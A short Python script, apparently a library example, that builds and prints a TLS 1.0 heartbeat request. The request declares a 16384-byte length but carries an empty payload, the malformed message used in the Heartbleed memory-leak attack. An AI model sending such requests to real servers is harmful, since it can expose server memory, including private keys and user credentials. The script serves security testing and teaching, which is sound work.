from tls_attack.structure import *

header = TLSHeader (
    version = TLSVersion.TLS10,
    body = TLSHeartbeat (
        heartbeat_type = TLSHeartbeatMessageType.HEARTBEAT_REQUEST,
        length = 0x4000,
        payload = b""
    )
)

print(header)